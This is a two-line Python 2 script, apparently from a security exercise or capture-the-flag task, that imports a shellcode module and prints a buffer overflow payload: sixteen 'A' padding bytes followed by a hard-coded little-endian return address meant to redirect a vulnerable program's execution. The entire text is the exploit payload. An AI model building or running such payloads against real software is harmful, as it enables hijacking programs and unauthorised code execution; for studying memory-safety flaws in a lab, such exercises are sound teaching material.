from shellcode import shellcode

print "A" * 16 + "\xfe\x8e\x04\x08"
